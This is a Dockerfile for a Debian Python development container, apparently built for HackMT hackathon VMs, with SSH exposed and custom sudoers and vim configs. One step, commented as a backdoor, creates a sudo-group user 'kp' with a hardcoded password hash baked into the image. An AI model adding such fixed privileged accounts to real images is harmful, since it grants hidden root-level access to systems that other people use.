#FROM kprpi
FROM debian:latest

# To run this container use the following command:
# docker run -d --name dev0001 -p 192.168.1.34:8989:22 -p 192.168.1.34:4000:5000 -p 192.168.1.34:5001-5010:5001-5010 --hostname dev0001 python_dev

# Run the debian packages we need
# RUN apt-get update && apt-get -y install python python-pip python-dev build-essential openssh-server git libpam-ldapd libnss-ldapd nscd python3 python3-pip python3-dev libffi-dev sqlite3 python3-setuptools nano wget apt-transport-https ca-certificates curl gnupg2 software-properties-common
RUN apt-get update && apt-get -y install build-essential openssh-server git nscd python3 python3-dev libffi-dev sqlite3 python3-setuptools nano wget apt-transport-https ca-certificates curl gnupg2 software-properties-common python3-pip sudo vim openvpn

# Add the python3 packages we need
RUN pip3 install wheel flask bcrypt flake8

# This directory was missing
RUN mkdir /var/run/sshd

# Custom Configs for HackMT VMs
# We will setup SSH, PAM, LDAP, etc.
COPY sshd_config /etc/ssh/sshd_config
COPY motd /etc/motd
COPY issue.net /etc/issue.net
COPY start.sh /tmp/start.sh
COPY sudoers /etc/sudoers
COPY defaults.vim /usr/share/vim/vim80/defaults.vim
COPY kenny.vim /usr/share/vim/vim80/colors/kenny.vim
COPY vimrc /etc/vim/vimrc
COPY python.vim /usr/share/vim/vim80/syntax/python.vim

# Create a backdoor user
RUN useradd -m -G sudo -p aa4jkZntsrRY. -s /bin/bash kp
COPY vimrc /home/kp/.vimrc

# We will expose other ports with the run command
# but we always want this port
EXPOSE 22

CMD /tmp/start.sh
